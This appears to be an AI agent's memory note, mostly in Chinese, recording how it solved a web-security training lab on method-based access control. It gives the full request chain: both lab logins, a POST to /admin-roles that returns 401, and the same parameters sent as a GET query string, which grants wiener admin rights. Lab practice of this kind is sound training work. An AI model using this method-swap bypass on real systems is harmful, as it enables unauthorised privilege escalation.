---
metadata:
  node_type: memory
name: "PRS Lab Solve method-based access control circumvented"
description: "arm A 基线:lab-method-based-access-control-can-be-circumvented 冷实例一次通过 - 方法互换 GET 提权,POST 401"
last_updated: 2026-10-08T18:20:27+08:00
created: 2026-10-08T18:20:27+08:00
---

# arm A 基线 - method-based access control can be circumvented

日期 2026-10-08 会话;lab slug `lab-method-based-access-control-can-be-circumvented`;实例 id 前缀 0a1a00cb(冷,reused:false)。

## 结果
solved 一次通过。判据:`banner_verdict` = `solved:true` + 祝贺行。

## 链(全 HTTP 走件)
1. `page_read` lab 页 -> lab_id=E115E4B4...D1C83B(sha256 widget-lab-id)。
2. `range_launch launch <lab_id> --jar /tmp/cj1.json` -> 实例 URL,reused=false。
3. `http_session get /login --jar /tmp/admin-jar.json`(无 csrf 字段,登录表单只有 username/password)。
4. `http_session post /login --form username=administrator --form password=admin` -> 302 /my-account?id=administrator。
5. `http_session get /admin`(admin jar)-> 面板表单:`action='/admin-roles' method='POST'`,参数 `username`(carlos/administrator/wiener)+ 按钮 `action=upgrade|downgrade`。
6. wiener 独立 jar 登录(wiener:peter)-> 302 /my-account?id=wiener。
7. 基线:`http_session post /admin-roles --form username=wiener --form action=upgrade`(wiener jar)-> **401**。
8. 绕过:`http_session get /admin-roles?username=wiener&action=upgrade`(wiener jar)-> **302 /admin**,提权成功。
9. 复核:`get /admin`(wiener jar)= 200 面板可读;`banner_verdict` solved:true。

## 要点
- 该 lab 的 admin 面按方法做访问控制:POST 拦(401 JSON),同参数换 GET + 查询串即放行。
- 登录/管理面均无 CSRF token,参数直接投递即可;两个会话用两个 jar 隔离(admin 用于侦察请求形状,wiener 用于利用)。
- 侦察步(administrator:admin)只取端点/参数形状,未依赖任何题解文本。

